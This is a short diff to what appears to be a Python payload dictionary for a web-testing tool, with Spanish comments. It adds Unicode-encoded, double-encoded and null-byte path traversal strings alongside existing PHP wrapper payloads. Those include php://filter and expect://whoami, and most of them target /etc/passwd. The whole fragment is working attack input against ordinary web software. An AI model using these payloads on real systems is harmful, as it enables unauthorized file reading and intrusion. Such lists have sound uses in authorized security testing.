@@ -120,7 +120,15 @@ PATH_TRAVERSAL_PAYLOADS = {
         "php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=../../../../etc/passwd", # Encoding Trick
         "expect://whoami", # Expect Wrapper (if enabled)
         "data://text/plain;base64,Li4vLi4vZXRjL3Bhc3N3ZA==", # Base64 Data URI
-    ]
+    ],
+    "unicode": [
+        "..%c0%af",  # Carácter Unicode para /
+        "..%252f",   # Codificación doble
+    ],
+    "null_byte": [
+        "../../../../etc/passwd%00",
+        "..;/etc/passwd%00",  # Combinación de ; y null byte
+    ],
 } 
 
 # --- Out-of-Band (OOB) Payloads ---
